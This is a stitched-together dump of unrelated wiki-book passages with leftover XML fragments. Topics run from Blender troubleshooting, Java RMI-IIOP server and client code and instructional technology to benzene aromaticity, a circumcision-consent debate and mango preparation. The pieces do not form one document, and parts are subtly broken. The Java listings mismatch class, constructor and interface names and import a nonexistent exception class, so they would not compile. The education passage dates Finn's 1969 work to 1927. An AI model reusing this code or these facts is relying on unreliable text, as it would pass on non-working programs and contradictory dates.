'''''Reader''': I have been using Blender for a while now, but due to my school's administrative limitations I am only able to use it on certain computers in school. For example, the computers that have already had 3d programs installed on them (like the ones in the Drafting and Design room) allow me to use Blender. Other computers give me an error message concerning MSVCR71.dll when I try to use it (specifically the ones in my Study Hall). Could you give me an alternate method of installing the .dll (maybe I can put it on a flash drive or in the My Documents folder)?''
'''''Answer''': Unfortunately, without administrative rights you will not be able to install a DLL.''
'''''Answer 2''': My school has the same type of administrative blocks, however I placed everything from my blender folder at home onto a flash drive, and now it works perfectly on all computers. Maybe try that?''

2) Switch from the Blender Internal rendering engine to the Yafray rendering engine as explained and press F12 to Render. Wow, You should have noticed the lightning speed of Yafray.

== YafRay tab ==
*'''XML button''': If pressed blender will export an xml file that describes the scene and will pass it to YafRay. If not pressed blender will render with the YafRay plugin. When using the plugin interface, the render in progress will update continuously in Blender's render window. This gives much faster feedback. It even shows the distribution of the samples taken by the path light when rendering with cached pathlight. YafRay divides the image into blocks and renders them in a random sequence.

      <text xml:space="preserve">Nouns in Sanskrit have three numbers (singular, dual and plural) and one of three genders(masculine, feminine and neuter).

They also have eight cases: nominative, vocative, accusative, instrumental, dative, ablative, genitive, and locative.

{{Java Programming/Navigation|previous=Remote Method Invocation|next=EJB}}
{{Java Programming/ConcurrentTopic/Nav}}
__NOTOC__
{{Mergeto|Java Programming/Remote Method Invocation}}&lt;/noinclude&gt;

RMI-IIOP (RMI over IIOP) is provided with the Java SDK. It combines Remote Method Invocation (RMI) technology with the Internet Inter-Orb Protocol (IIOP) to provide CORBA to the Java platform. Java developers do not have to provide IDL in order to provide CORBA capabilities.
===The Remote Interface===
{{XCode|1='''Code listing 7.1: HowdyInterface.java'''
&lt;source lang=&quot;Java&quot;&gt;
import java.rmi.Remote;

public interface HowdyInterface extends java.rmi.Remote {
  public void sayHowdy() throws RemoteException;
}
&lt;/source&gt;}}

The above code defines a remote interface called HowdyInterface that will define what the remote client may call on the server. All of the operations must throw a RemoteException. The interface must extend java.rmi.Remote.

== The Implementation Class ==
{{XCode|1='''Code listing 7.2: HowdyImpl.java'''
&lt;source lang=&quot;Java&quot;&gt;
import javax.rmi.PortableRemoteObject;
import javax.rmi.RemoteException;

public class HowdyImpl implements HowdyInterface {
  public HelloImpl() throws java.rmi.RemoteException {
    PortableRemoteObject.exportObject(this);     // Initializes the remote object
  }

  public void sayHowdy() throws RemoteException {
    System.out.println(&quot;Weeee doggies! Howdy!!&quot;);
  }
}
&lt;/source&gt;}}

The implementation class allows for the object to be ORB-initialized. It also implements the remote operation to be called. The implementation could have extended &lt;code&gt;PortableRemoteObject&lt;/code&gt;, in which case the &lt;code&gt;exportObject&lt;/code&gt; call in the constructor would be removed. The better approach would seem to be as coded above.

== The Server Class ==
{{XCode|1='''Code listing 7.3: HowdyServer.java'''
&lt;source lang=&quot;Java&quot;&gt;
import javax.naming.InitialContext;
import javax.naming.Context;
import javax.rmi.PortableRemoteObject ;
import com.sun.corba.se.internal.POA.POAORB;
import org.omg.PortableServer.*;
import java.util.*;
import org.omg.CORBA.*;
import javax.rmi.CORBA.Stub;
import javax.rmi.CORBA.Util;

public class HowdyServer {
  public HowdyServer(String[] args) {
    try {
      Properties p = System.getProperties();
      // add runtime properties here
      p.put(&quot;org.omg.CORBA.ORBClass&quot;,
          &quot;com.sun.corba.se.internal.POA.POAORB&quot;);
      p.put(&quot;org.omg.CORBA.ORBSingletonClass&quot;,
          &quot;com.sun.corba.se.internal.corba.ORBSingleton&quot;);

      ORB orb = ORB.init( args, p );

      POA rootPOA = (POA)orb.resolve_initial_references(&quot;RootPOA&quot;);

      Policy[] tpolicy = new Policy[3];
      tpolicy[0] = rootPOA.create_lifespan_policy(
        LifespanPolicyValue.TRANSIENT );
      tpolicy[1] = rootPOA.create_request_processing_policy(
        RequestProcessingPolicyValue.USE_ACTIVE_OBJECT_MAP_ONLY );
      tpolicy[2] = rootPOA.create_servant_retention_policy(
        ServantRetentionPolicyValue.RETAIN);
      POA tPOA = rootPOA.create_POA(&quot;MyTransientPOA&quot;, null, tpolicy);
          
      tPOA.the_POAManager().activate();

      HowdyImpl howdyImpl = new HowdyImpl();
      _HowdyImpl_Tie tie = (_HowdyImpl_Tie)Util.getTie( howdyImpl );
      String howdyId = &quot;howdy&quot;;
      byte[] id = howdyId.getBytes();
      tPOA.activate_object_with_id( id, tie );


      Context initialNamingContext = new InitialContext();
      initialNamingContext.rebind(&quot;HowdyService&quot;,
        tPOA.create_reference_with_id(id,
          tie._all_interfaces(tPOA,id)[0]) );
      System.out.println(&quot;Howdy Server: Ready...&quot;);
      
      orb.run();
    }
      catch (Exception e) {
        System.out.println(&quot;Error running HowdyServer: &quot; + e);
        e.printStackTrace();
      }
  }

  public static void main(String args[]) {
    new HowdyServer( args );
  }
}
&lt;/source&gt;}}

== The Client Class ==
{{XCode|1='''Code listing 7.4: HelloClient.java'''
&lt;source lang=&quot;Java&quot;&gt;
import java.rmi.RemoteException;
import java.net.MalformedURLException;
import java.rmi.NotBoundException;
import javax.rmi.*;
import java.util.Vector;
import javax.naming.NamingException;
import javax.naming.InitialContext;
import javax.naming.Context;

public class HelloClient {

  public static void  main( String args[] ) {
    Context ic;
    Object objref;
    HelloInterface hi;

    try {
      ic = new InitialContext();
    } catch (NamingException e) {
        System.out.println(&quot;failed to obtain context&quot; + e);
        e.printStackTrace();
        return;
    }
        
    try {
      objref = ic.lookup(&quot;HowdyService&quot;);
      System.out.println(&quot;Client: Obtained a reference to Howdy server.&quot;);
    } catch (NamingException e) {
        System.out.println(&quot;failed to lookup object reference&quot;);
        e.printStackTrace();
        return;
    }

    try {
      hi = (HowdyInterface) PortableRemoteObject.narrow(
        objref, HowdyInterface.class);
      hi.sayHowdy();
    } catch (ClassCastException e) {
        System.out.println(&quot;narrow failed&quot;);
        e.printStackTrace();
        return;
      } catch( Exception e ) {
            System.err.println( &quot;Exception &quot; + e + &quot;Caught&quot; );
            e.printStackTrace( );
            return;
        }
  }
}
&lt;/source&gt;}}

The client code uses the name service to look up the server and make the remote invocation.

      <text xml:space="preserve">There are two views for the definition of technology. Traditionalists view it as the systematic application of science to practical problems. A more contemporary view is that technology is the application of knowledge so that it can be built from one generation to the next (Braudel in Seels &amp; Richey, p. 7). The second view is not synonymous with integration, although it certainly does have implications for integration, but in a systematic way. As such, technology includes tools, processes, applications, skills and  organization. Technology in education or instruction is more than the technical application of tools, machines, computers, products and communication systems (such as multimedia, computerized instruction, games, simulations or interactive video). It also encompasses the &quot;application of the principles of science in order to solve learning problems...&quot; (Seels &amp; Richey, p.6).

Historically, Instructional Technology (IT) grew out of audiovisual communications and according to Seels &amp; Richey (1994) Jim Finn is credited with initiating the development of the field of Instructional Technology in response to his desire to make audiovisual communications a profession. 

IT meets most or all of the six characteristics of a profession as described by James Finn (1969):

*An intellectual technique
*An application of that technique
*A long period of training
*An association of members
*Enforced standards and a statement of ethics
*A body of intellectual theory (p. 232)

At the time of Finn's writing (1927), he noted that of the six defining characteristics of a profession, IT only possessed two. Finn believed that IT would become more credible and professional as more members of the field participated in activities that supported the aforementioned characteristics.  


The field of Instructional Technology is not synonymous with the use of technology in education; instead, it is a discipline, a field of study, a craft, and an art. 

In 1994, the [http://www.aect.org/ Association for Education Communications and Technology (AECT)] defined Instructional Technology as &quot;the theory and practice of design, development, utilization, management and evaluation of processes and resources for learning&quot; (Seels &amp; Richey, p. 1). This definition emphasized the need for balance between the field's theory base and practical use.  Additionally, it outlined the domains IT seeks to influence while also establishing that these domains do not exist in a linear relationship to each other. The domains are conceived as independent of each other but connected. 

As reflected in the list of topics below, the interests of IT are broad and varied, encompassing a wide range of topics related to practice, application and theory. This book is a collaborative effort between graduate students in the Instructional Technology program at Wayne State University to provide an introduction to the field of Instructional Technology.

      <text xml:space="preserve">In front of you is a balance. Your task is to devise a system, using 4 weights, so that any whole number of kilograms can be weighed up to ''n'' kg, where ''n'' should be the largest possible.

'''Example:'''
Suppose you use these weights: 1 kg, 2 kg, 4 kg, 8 kg. This way you can weigh any weight up to ''n''=15 kg by combining these weights.

1 kg = 1 kg&lt;br /&gt;
2 kg = 2 kg&lt;br /&gt;
3 kg = 2 kg + 1 kg&lt;br /&gt;
...&lt;br /&gt;
14 kg = 8 kg + 4kg + 2 kg&lt;br /&gt;
15 kg = 8 kg + 4 kg + 2 kg + 1 kg

Solutions: [[Puzzles/Logic puzzles/Scales and Weights/Solution 1|Up to 40 kg]] |

Weights are: 1, 3, 9, 27

== Explanation ==
You can put the weights on the other side of the balance, therefore subtracting some of the weight from the other side. Using this system the objects can be weighed thus:

1kg = 1kg

2kg = 3kg - 1kg

3kg = 3kg

...

39kg = 27kg + 9kg + 3kg

40kg = 27kg + 9kg + 3kg + 1kg

&lt;/noinclude&gt;

After understanding the usefulness of unsaturated compound, or conjugated system, we hope to explore the unique structure of [[Organic Chemistry/Aromatics in history|aromatic]] compounds, including why benzene should not be called 1,3,5-cyclohexatriene because it is more stable than a typical triene, and seemingly unreactive. Called &quot;aromatic&quot; initially because of its fragrance, aromaticity now refers to the stability of compounds that are considered aromatic, not only benzene. Any cyclic compound with 4n+2 pi electrons in the system is aromatic. The stability of aromatic compounds arises because all bonding orbitals are filled and low in energy.
=History of Aromatics=
Early in the 19th century, advances in equipment, technique and communications resulted in chemists discovering and experimenting with novel chemical compounds.  In the course of their investigations they stumbled across a different kind of stable compound with the molecular formula of C&lt;sub&gt;6&lt;/sub&gt;H&lt;sub&gt;6&lt;/sub&gt;.  Unable to visualize what such a compound might look like, the scientists invented all sorts of models for carbon-to-carbon bonding -- many of which were not entirely stable -- in order to fit what they had observed to what they expected the C&lt;sub&gt;6&lt;/sub&gt;H&lt;sub&gt;6&lt;/sub&gt; compound to look like.

Benzene (which is the name that was given to the aromatic compound C&lt;sub&gt;6&lt;/sub&gt;H&lt;sub&gt;6&lt;/sub&gt;) is probably the most common and industrially important aromatic compound in wide use today.  It was discovered in 1825 by Michael Faraday, and its commercial production from coal tar (and, later on, other natural sources) began in earnest about twenty-five years later. The structure of benzene emerged during the  1860s, the result of contributions from several chemists,  most famously that of  [http://en.wikipedia.org/wiki/Kekulé Kekulé].

Scientists of the time did not have the benefit of understanding that electrons are capable of delocalization, so that all carbon atoms could share the same &amp;pi;-bond electron configuration equally.  [http://en.wikipedia.org/wiki/Erich_Huckel Huckel] was the first to apply the new theory of quantum mechanics  to clearly separating &amp;sigma;  and  &amp;pi; electrons. He went on to develop a theory of  &amp;pi; electron bonding for benzene, which was the first to explain the electronic origins of aromaticity.

=Benzene Structure=
Benzene is a hexagonal ring of six carbon atoms connected to each other through one p-orbital per carbon. Its chemical formula is C&lt;sub&gt;6&lt;/sub&gt;H&lt;sub&gt;6&lt;/sub&gt;, and its structure is a hexagonal ring of carbons sharing symmetrical bonds, with all six hydrogen atoms protruding outwards from the carbon ring, but in the same plane as the ring. The p-orbital system contains 6 electrons, and one way to distribute the electrons yields the following structure:

:[[File:Benzol.svg|45px]] 

However, another resonance form of benzene is possible, where the single bonds of the first structure are replaced with double bonds, and the double bonds with single bonds. These two resonance forms are co-dominant in benzene. (Other forms, such as a structure with a π bond connecting opposite carbons, are possible but negligible.) Thus, each bond in benzene has been experimentally shown to be of equal length and strength, and each is accounted as approximately a &quot;1.5&quot; bond instead of either a single or double bond alone.

Electron density is shared between carbons, in effect yielding neither a single nor a double bond, but a sort of one-and-a-half bond between each of the six carbons. Benzene has a density of negative charge both above and below the plane formed by the ring structure.  Although benzene is very stable and does not tend to react energetically with most substances, electrophilic compounds may be attracted to this localized electron density and such substances may form a bond with the aromatic benzene ring.

An electron delocalisation ring can be used to show in a single picture both dominant resonance forms of benzene:

==Benzene Properties==

Benzene is a colorless, flammable liquid with a sweet aroma and carcinogenic effects. The aromatic properties of benzene make it far different from other alkenes in many ways.

===Benzene Reactions===

:''Main article:'' [[Organic Chemistry/Aromatic reactions|Aromatic reactions]]

Unlike alkenes, aromatic compounds such as benzene undergo substitution reactions instead of addition reactions. The most common reaction for benzene to undergo is electrophilic aromatic substitution (EAS), although in a few special cases, substituted benzenes can undergo nucleophilic aromatic substitution.

==Benzene Health Effects==
In the body, benzene is metabolized, and benzene exposure may have quite serious health effects. Breathing in very high levels of benzene can result in death, while somewhat lower (but still high) levels can cause drowsiness, dizziness, rapid heart rate, headaches, tremors, confusion, and unconsciousness. Eating or drinking foods containing high levels of benzene can cause vomiting, irritation of the stomach, dizziness, sleepiness, convulsions, rapid heart rate, and even death.


The major effect of benzene from chronic (long-term) exposure is to the blood. Benzene damages the bone marrow and can cause a decrease in red blood cells, leading to anemia. It can also cause excessive bleeding and depress the immune system, increasing the chance of infection.  Some women who breathed high levels of benzene for many months had irregular menstrual periods and a decrease in the size of their ovaries. It is not known whether benzene exposure affects the developing fetus in pregnant women or fertility in men, however animal studies have shown low birth weights, delayed bone formation, and bone marrow damage when pregnant animals breathed benzene.


The US Department of Health and Human Services (DHHS) also classifies benzene as a human carcinogen. Long-term exposure to high levels of benzene in the air can cause leukemia, a potentially fatal cancer of the blood-forming organs. In particular, Acute Myeloid Leukemia (AML) may be caused by benzene.

=Aromaticity=
Aromaticity in organic chemistry does not refer to whether or not a molecule triggers a sensory response from olfactory organs (whether it &quot;smells&quot;), but rather refers to the arrangement of electron bonds in a cyclic molecule.  Many molecules that have a strong odor (such as diatomic chlorine Cl&lt;sub&gt;2&lt;/sub&gt;) are not aromatic in structure -- odor has little to do with chemical aromaticity.  It was the case, however, that many of the earliest-known examples of aromatic compounds had distinctively pleasant smells. This property led to the term &quot;aromatic&quot; for this class of compounds, and hence the property of having enhanced stability due to delocalized electrons came to be called &quot;aromaticity&quot;.


==Definition==
Aromaticity is a chemical property in which a conjugated ring of unsaturated bonds, lone pairs, or empty orbitals exhibit a stabilization stronger than would be expected by the stabilization of conjugation alone. It can also be considered a manifestation of cyclic delocalization and of resonance.


This is usually considered to be because electrons are free to cycle around circular arrangements of atoms, which are alternately single- and double-bonded to one another. These bonds may be seen as a hybrid of a single bond and a double bond, each bond in the ring identical to every other. This commonly-seen model of aromatic rings was developed by Kekulé. The model for benzene consists of two resonance forms, which corresponds to the double and single bonds' switching positions. Benzene is a more stable molecule than would be expected of cyclohexatriene, which is a theoretical molecule.


==Theory==
By convention, the double-headed arrow indicates that two structures are simply hypothetical, since neither can be said to be an accurate representation of the actual compound. The actual molecule is best represented by a hybrid (average) of most likely structures, called resonance forms. A carbon-carbon double bond is shorter in length than a carbon-carbon single bond, but aromatic compounds are perfectly geometrical (that is, not lop-sided) because all the carbon-carbon bonds have the same length.  The actual distance between atoms inside an aromatic molecule is intermediate between that of a single and that of a double bond.


A better representation than Lewis drawings of double and single bonds is that of the circular &amp;pi; bond (Armstrong's inner cycle), in which the electron density is evenly distributed through a &amp;pi; bond above and below the ring. This model more correctly represents the location of electron density within the aromatic molecule's overall structure.  The single bonds are sigma (&amp;sigma;) bonds formed with electrons positioned &quot;in line&quot; between the carbon atoms' nuclei. Double bonds consist of one &quot;in line&quot; &amp;sigma; bond and another non-linearly arranged bond -- a &amp;pi;-bond. The &amp;pi;-bonds are formed from the overlap of atomic p-orbitals simultaneously above and below the plane of the ring formed by the &quot;in line&quot; &amp;sigma;-bonds.


Since they are out of the plane of the atoms, &amp;pi; orbitals can interact with each other freely, and thereby they become delocalized. This means that, instead of being tied to one particular atom of carbon, each electron can be shared by all the carbon atoms in an aromatic ring. Thus, there are not enough electrons to form double bonds on all the carbon atoms, but the &quot;extra&quot; electrons strengthen all of the bonds of the ring equally.


==Characteristics==
An aromatic compound contains a set of covalently-bound atoms with specific characteristics:
#The molecule has to be cyclic
#A delocalized conjugated pi system, most commonly an arrangement of alternating single and double bonds (can sometimes include triple bonds if the geometry of the molecule permits)
#Coplanar structure, with all the contributing atoms in the same plane 
#A number of pi delocalized electrons that is even, but not a multiple of 4. (This is known as Hückel's (4n+2)Π rule, where,n= 0,1,2,3 and so on. Permissible numbers of &amp;pi; electrons include 2, 6, 10, 14, and so on)
#Special reactivity in organic reactions such as electrophilic aromatic substitution and nucleophilic aromatic substitution 


Whereas benzene is aromatic (6 electrons, from 3 double bonds), cyclobutadiene is not, since the number of &amp;pi; delocalized electrons is 4, which is not satisfied by any n integer value. The cyclobutadienide (2−) ion, however, is aromatic (6 electrons). An atom in an aromatic system can have other electrons that are not part of the system, and are therefore ignored for the 4n + 2 rule. In furan, the oxygen atom is sp&lt;sup&gt;2&lt;/sup&gt; hybridized. One lone pair is in the &amp;pi; system and the other in the plane of the ring (analogous to C-H bond on the other positions). There are 6 &amp;pi; electrons, so furan is aromatic.


Aromatic molecules typically display enhanced chemical stability, compared to similar non-aromatic molecules. The circulating (that is, delocalized) &amp;pi; electrons in an aromatic molecule generate significant local magnetic fields that can be detected by NMR techniques. NMR experiments show that protons on the aromatic ring are shifted substantially further down-field than those on aliphatic carbons. Planar monocyclic molecules containing 4n &amp;pi; electrons are called anti-aromatic and are, in general, destabilized. Molecules that could be anti-aromatic will tend to alter their electronic or conformational structure to avoid this situation, thereby becoming merely non-aromatic.


Aromatic molecules are able to interact with each other in so-called &amp;pi;-&amp;pi; stacking: the &amp;pi; systems form two parallel rings overlap in a &quot;face-to-face&quot; orientation. Aromatic molecules are also able to interact with each other in an &quot;edge-to-face&quot; orientation: the slight positive charge of the substituents on the ring atoms of one molecule are attracted to the slight negative charge of the aromatic system on another molecule.

=Monosubstituted Benzenes=
Benzene is a very important basic structure which is useful for analysis and synthesis in most aspects of organic chemistry.  The benzene ring itself is not the most interesting or useful feature of the molecule; which substitutents and where they are placed on the ring can be considered the most critical aspect of benzene chemistry in general.



==Effects of Different Substituents==
Depending on the type of substituent, atoms or groups of atoms may serve to make the benzene ring either more reactive or less reactive.  If the atom or group makes the ring more reactive, it is called '''activating''', and if less, then it is called '''deactivating'''.  

Generally, the terms activating and deactivating are in terms of the reactions that fall into the category of Electrophilic Aromatic Substitution (EAS). These are the most common forms of reactions with aromatic rings. Aromatic rings can undergo other types of reactions, however, and in the case of Nucleophilic Aromatic Substitution, the activating and deactivating nature of substituents on the rings is reversed. In EAS, a hydroxyl groups is strongly activating, but in Nucleophilic Aromatic Substitution, a hydroxyl group is strongly deactivating. But since EAS is the most common reaction with aromatic rings, when discussing activation and deactivation, it's normally done in terms of the EAS. 

In addition to activating or deactivating, all groups and/or substituent atoms on a benzene ring are '''directing'''.  An atom or group may encourage additional atoms or groups to add or not to add to certain other carbons in relation to the carbon connected to the directing group. This concept will be further discussed in the next chapter, but when memorizing the groups below it is helpful to also memorize whether it is O (ortho), M (meta) or P (para)-directing.

Another factor that heavily influences direction, however, is steric hindrance. If, for example, you have a tert-butyl substituent on the ring, despite the fact that it is ortho/para directing, the ortho positions will be largely blocked by the tert-butyl group and thus nearly all the product would be para.

==Activating Substituents==
Activating substituents make benzene either slightly more reactive or very much more reactive, depending on the group or atom in question.  In general, if one of the major heteroatoms (nitrogen or oxygen) is ''directly'' attached to the carbon ring then the result is probably activation.  This is merely a rule of thumb, and many exceptions exist, so it is best to memorize the groups listed below instead of counting on a quick and dirty rule of thumb.

&lt;center&gt;

|}
&lt;/center&gt;

==Deactivating Substituents==
A deactivating group is a functional group attached to a benzene molecule that removes electron density from the benzene ring, making electrophilic aromatic substitution reactions slower and more difficult than they would be on benzene alone. As discussed above for activating groups, deactivating groups may also determine the positions (relative to themselves) on the benzene ring where substitutions take place, so each deactivating group is listed below along with its directing characteristic.

&lt;/center&gt;

==Activation vs. Deactivation and ortho/para vs. meta directing ==

So why are some substituents activating or deactivating? Why are some meta directing and others ortho/para directing? From the above tables, it seems pretty clear there's a relationship.

There are primarily two effects that substituents impart on the ring that affect these features:

# Resonance effects
# Inductive effects


===Resonance Effects===
Let's first look at resonance effects. Resonance effects are the ability or inability of a substituent to provide electrons to the ring and enhance its resonance stability. To see this, we must first get a basic understanding of the mechanism of Electrophilic Aromatic Subsitution. We'll discuss EAS in more detail in the next section, but some basics are called for here.

[[Image:EAS-mechanism.png|center|Basic Mechanism of Electrophilic Aromatic Substitution]]

As you can see in the image above, the electrophile is attacked by pi electrons in the ring. The same carbon is now bonded to both the hydrogen that was bonded to it and the electrophile. This in turn creates a carbocation on the adjacent carbon, making the ring non-aromatic. But aromatic rings like to remain aromatic. The nucleophile which was previously bonded to the electrophile now attacks the hydrogen, abstracting it from the ring and allowing the pi-bond to re-form and returning the ring to its aromatic nature.

As we've seen before in some other reactions, when a carbocation is created as an intermediate, stability of that carbocation is crucial to the reaction. This is the case in Electrophilic Aromatic Subsitution as well.

So what is the effect of substituents on the ring?

[[Image:EAS-ortho-para-meta.png|center|Resonance Stability of ortho, para, and meta attacks.]]

Let's look at the situation above. In this case we have Phenol, a benzene ring with an -OH (hydroxyl) group attached. When we nitrate the ring with nitric acid in sulfuric acid (a reaction we'll discuss in the next section), a nitro group is attached to the benzene ring.

There are 3 possible places for the nitro group to attach: An ortho, meta, or para position. To understand the stability of the carbocation, we need to look at the resonance structures for a given attack and see what the results are.

The first resonance structure of the ortho attack results in a positive charge on the carbon with the hydroxyl group. This happens to be the most stable of the 3 resonance structures for an ortho attack because the two negative electron pairs in the oxygen act to stabilize the positive charge on the carbon. The other two resonance forms leave a carbon with a hydrogen attached, to hold the positive charge. Hydrogen can do nothing to stabilize the charge and thus, these are less stable forms.

In the para attack situation, notice that the second resonance form also puts a positive charge on the carbon with the hydroxyl group. This provides for stability just as it does in the case of an ortho attack and thus, the middle resonance form is very stable.

Finally, in the meta attack situation, all of the resonance forms result in a positive charge on a carbon with only a hydrogen attached. None of these is stable, and thus, meta attack with a hydroxyl group attached, is a very small percentage of the product.

So the electron pairs in the oxygen act to stabilize the ortho and para attacks.

===Inductive Effects===
Now let's look at the inductive effects of deactivating substituents. Let's imagine that, instead of a hydroxyl group, we instead have a carbonyl group attached to the ring in its place. When a carbonyl is attached, the ring is bonded to a carbon which in turn, is double-bonded to an oxygen, the double-bonded oxygen is withdrawing electrons and this inductive effect is felt on the ring, strongly deactivating its pi-bond nature and putting a positive dipole on the carbon. Looking at the resonance structures, this carbon, which already has some positive nature is now given the added resonance of a positive charge, in the case of ortho and para attacks. Positive plus positive equals more positive and thus, less stable. There's no negative charge or negative electron pair to stabilize this positive charge.

So in this case, not only is the entire ring less activated, but the ortho and para attacks result in much more unstable carbocation resonance forms. Hence, meta is the preferred position, but the overall reaction is less active than plain benzene.

===Halides as the Exception===
Notice that in the list of activating vs. deactivating substituents, the activating ones are all ortho/para directing. In the deactivating substituents, all but the halides, are meta directing. Why are halides an exception?

Because halides are more electronegative than carbon, they induce a positive dipole on the attached carbon and a negative dipole on their own atom(inductive effect), and in accordance to the previous logic of activating/deactivating substituents, deactivate the ring. However, halides also possess lone pair electrons in their outer shell to share with the ring, allowing the resonance structures with favored ortho/para attacks versus meta attacks due to their poor resonance forms. In essence, although halides do deactivate the ring to some extent, they provide major resonance contributors due to the availability of their lone pairs. Resonance structures usually trump the inductive effect.

==Detailed Effects of Substituents==

We've discussed some generalities about the effects of substituents and even some specifics about certain ones, but let's look more closely at the substituents and try to understand the details of what makes them activating vs. deactivating.

-NH&lt;sub&gt;2&lt;/sub&gt;, -NHR, and -NRR are all very strongly activating. Though nitrogen is more electronegative than carbon, its ability to share a pair of electrons greatly outweighs its electron withdrawing effect.

-OH and -O&lt;sup&gt;-&lt;/sup&gt; is similar in that it is even more electronegative than nitrogen, but it has two pairs of electrons to share, which also greatly outweighs its electon withdrawing effect.

-NHCOCH&lt;sub&gt;3&lt;/sub&gt; and -NHCOR are also strongly activating, but the inductive effect of the double-bonded oxygen acts to make the nitrogen more electron withdrawing, so they're not quite as activating as the other -N subsituents above.

-OCH&lt;sub&gt;3&lt;/sub&gt; and -OR are also still strongly activating, but less so, because the electron density is shared on both sides of the oxygen.

-CH&lt;sub&gt;3&lt;/sub&gt; and -R in general provide some electron density sharing, but not nearly as much as a pair of electrons. Thus their effect is only weakly felt.

For deactivating groups we have:

-NO&lt;sub&gt;2&lt;/sub&gt;, or nitro and -NR&lt;sub&gt;3&lt;/sub&gt;&lt;sup&gt;+&lt;/sup&gt;. The nitro group is very strongly deactivating because of its resonance structure. The nitro group has two resonance forms: O=N&lt;sup&gt;+&lt;/sup&gt;-O&lt;sup&gt;-&lt;/sup&gt; and O&lt;sup&gt;-&lt;/sup&gt;-N&lt;sup&gt;+&lt;/sup&gt;=O. Both of these forms leave a full positive charge on the nitrogen making it completely unable to help stabilize the positive carbocation intermediate. The same applies to -NR&lt;sub&gt;3&lt;/sub&gt;&lt;sup&gt;+&lt;/sup&gt;.

-CF&lt;sub&gt;3&lt;/sub&gt; and -CCl&lt;sub&gt;3&lt;/sub&gt; both have an inductive electronegative effect of 3 halides, but with no electrons to share with the ring, leaving them also very strongly deactivating.

-CN has a triple bond between the carbon and nitrogen with a resonance form of a double bond between the carbon and nitrogen and a positive charge on the carbon, meaning that between the electronegativity of the nitrogen and positively charged carbon in the resonance form, it destabilizes the carbocation and offer no electrons to the ring.

-SO&lt;sub&gt;3&lt;/sub&gt;, -COR, -CO&lt;sub&gt;2&lt;/sub&gt;R - all of these have electronegative oxygens giving the carbon a positive partial charge and providing no electrons for stability on the ring.

-F, -Cl, -Br, all have a similar effect. They are electronegative and deactivate the ring, but have electrons to share that, to some degree, makes up for it, allowing the ortho/para direction. But to understand their effects better, you need to look at them in terms of their placement on the periodic chart. Florine is the most electronegative element and it's very small and thus very close to the carbon it's bonded to. This gives its electromagnetic influence a stronger deactivating character. Chlorine is less electronegative, but it's also larger and thus further away from the carbon, making it harder for it to share its electrons. And so on.

=Polysubstituted Benzenes=
Unsubstituted benzene is seldom encountered in nature or in the laboratory, and you will find in your studies that most often benzene rings are found as parts of other, more complicated molecules.  In order for benzene to react in most situations, it gains or loses some functionality dependent on which functional groups are attached.  Although the simplest case is to work with benzene that has only one functional group, it is also essential to understand the interactions and competitions between multiple functional groups attached to the same benzene ring.

When there is more than one substituent present on a benzene ring the spatial relationship betwen groups becomes important, which is why the arene substitution patterns '''ortho''', '''meta''' and '''para''' were devised. For example three isomers exist for the molecule cresol because the methyl group and the hydroxyl group can be placed either next to each other (''ortho''), one position removed from each other (''meta'') or two positions removed from each other (''para'').  Where each group attaches is most often a function of which order they were attached in, due to the activating/deactivating and directing activities of previously attached groups.

[[Image:Cresol isomers.PNG]]

==Competition Between Functional Groups==

When a ring has more than one functional group, the effects of the groups are combined and their total effect must be taken into account. In general, effects are summed. For example, toluene (methylbenzene) is weakly activated. But p-nitrotoluene has both a methyl group and a nitro group. The methyl group is weakly activating and the nitro is pretty strongly deactivating, so overall, the group is very deactivated. In terms of direction, however, both substitutents agree on the direction. The methyl group is ortho/para directing. The nitro group occupies the para position, so the methyl will now want just ortho direction. The nitro group is meta directing. The positions meta to the nitro are also ortho to the methyl, so this works out and further substituents will be almost entirely in the positions ortho to the methyl group.

If two functional groups disagree on direction, the more activating group is the one that controls direction. That is, if you had m-nitrotoluene, most of your product would tend to be ortho/para to the toluene and not meta to the nitro, despite the nitro having a stronger influence on overall activation.


==Naming Conventions==
When a benzene ring has more than one substituent group attached, the location of all of the groups not directly attached to carbon number one must be explicitly declared.  This is done by listing the number of the carbon atom where the group is attached, followed by a hyphen and the group's name.  The carbon atoms of the benzene ring should be numbered in order of previously established precedence, i.e., a bromine would take precedence over a nitro group, which itself would take precedence over an alcohol or alkane group.  The names of the groups should be listed in alphabetical order, i.e. &quot;2-methyl-5-nitrobenzaldehyde.&quot;

      <text xml:space="preserve">Although the right to choose religious circumcision for one's self is non-controversial, the right of a caregiver to consent on behalf of a child for non-therapeutic surgery is more contested.

Generally there are two types of argument:  '''Supporters''' and '''Opponents'''.

==Religious freedom==
'''Supporters:''' Caregivers have a fundamental right to make religious decisions on behalf of children under their care.  The state has no right to limit this in any way.

'''Opponents:''' Circumcision is sexual assault and is therefore beyond the caregiver's rights of action against another person.  Religious freedom must be limited when health decisions are made on behalf of a minor.

'''Mangos''' are similar to peaches. They should be very sweet and juicy. Low-quality (but not rotten or unripe) mangos are fibrous and have a turpentine smell.

Mangos do not keep well. Non-rotten fresh ripe mangos are very rare. Many mangos start rotting right on the tree. The sliced mango in the picture has in fact just started to rot, as you can see by the dark-appearing translucent area. This mango would have a bit of a funny smell, vaguely like plastic or some sort of cleaning fluid. The translucent area is starting to liquefy. An unripe mango is crunchy, pale yellow on the inside, and not very sweet. Mangos should not have dark spots on the side; these indicate that the mango has started to rot. Mangos generally rot from the non-stem end, from the seed or pit, and from any dark spots on the outside. Black fibers indicate a different sort of rot, also bad.

When purchasing a mango, obviously avoid any signs of rot. A mango should feel solid, but not really hard. A mango should have a noticeable good smell. The small elongated variety with a pointy end will generally be of better quality than the larger and more rounded type.

There are many ingenious ways to open a mango, most failing to let you examine the mango for bad spots. (you can take off the sides and then flip them inside out for example) The more-or-less obvious method is best. Slice off the stem end with a sharp knife. Next, use the knife to help you peel the mango. Dig the knife in a bit at the stem-end cut, creating a pull tab. Peel away from this tab. Repeat all the way around the stem end, then elsewhere as needed. Be gentle in holding the fruit as you do this. Next, notice the symmetry. A mango contains a large flat seed that divides the fruit into two halves. Slide the knife along each side of the seed, cutting the fruit into three pieces. Cut away and discard any translucent areas. If you had to discard anything, rinse the remaining part to get rid of juices from the rotten part. Chop up the fruit as desired. The middle section may give you trouble; if it is good then you might just gnaw it from the seed.

Cooked mangos lose the characteristic mango smell and flavor. This can be desirable if you want a mush that tastes like [[Cookbook:Sweet Potato|sweet potatoes]]. You could serve cooked mangos with meat.

Green mangos are sometimes used in cooking. The whole mango may be chopped or thinly sliced, including the skin and seed.

      <text xml:space="preserve">==[[Cookbook:Sponge_Cake]] and [[Cookbook:Impossible Sponge_Cake]]==

The recipe for sponge cake is indeed incorrectly weighted.

